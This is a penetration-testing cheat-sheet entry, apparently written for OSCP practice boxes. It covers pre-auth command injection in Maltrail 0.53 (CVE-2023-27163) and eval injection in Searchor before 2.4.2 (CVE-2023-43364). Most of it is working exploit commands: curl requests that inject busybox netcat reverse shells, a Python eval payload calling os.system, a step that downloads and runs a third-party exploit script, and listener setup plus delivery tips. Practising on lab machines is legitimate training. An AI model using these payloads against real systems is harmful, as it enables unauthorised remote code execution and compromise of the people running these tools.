title: Maltrail 0.53 + Searchor 2.4.x — Command Injection via Login/Search
body:
Two Python web apps with the same class of vulnerability: unsanitised user input passed directly to a shell or eval. Both appear frequently on OSCP PG practice boxes.

Maltrail (CVE-2023-27163): IDS/traffic monitoring tool. The /login endpoint passes the username directly to subprocess without sanitisation. Pre-auth — no credentials needed. Fingerprint: nmap http-title 'Maltrail' or port 8338.

Searchor (CVE-2023-43364): Open source web scraping tool. The /search endpoint passes the query to eval() in Python. Fingerprint: Searchor in the page title or nmap, version < 2.4.2.
cmd:
# ══════════════════════════════════════════════════
# MALTRAIL CVE-2023-27163 (pre-auth command injection)
# ══════════════════════════════════════════════════
# Fingerprint: http-title 'Maltrail' | port 8338
# Exploit: inject into the username POST parameter

# Listener on Kali:
nc -lvnp <LPORT>

# Method A — curl direct injection:
curl -s 'http://<IP>:8338/login' \
  --data 'username=;`busybox nc <LHOST> <LPORT> -e /bin/sh`'

# Method B — Python PoC:
# https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5
python3 exploit.py <LHOST> <LPORT> http://<IP>:8338

# Also try port 80 if 8338 isn't open:
curl -s 'http://<IP>/login' --data 'username=;`busybox nc <LHOST> <LPORT> -e /bin/sh`'

# ══════════════════════════════════════════════════
# SEARCHOR CVE-2023-43364 (eval injection)
# ══════════════════════════════════════════════════
# Fingerprint: Searchor in http-title | versions < 2.4.2
# Exploit: inject Python into the search query (hits eval())

# PoC script:
curl -s https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/refs/heads/main/exploit.sh -o exploit.sh
bash exploit.sh http://<IP> <LHOST> <LPORT>

# Manual payload (inject into the search endpoint):
curl 'http://<IP>/search?query=__import__("os").system("busybox+nc+<LHOST>+<LPORT>+-e+/bin/sh")'

# Listener:
nc -lvnp <LPORT>
warn: Maltrail injection goes in the POST username field, not the password. Use busybox nc for the reverse shell on minimal containers. If the Maltrail login page redirects, submit directly to /login via curl — browser redirect may strip the payload. For Searchor, check the exact endpoint path — it may be /search or a custom route.
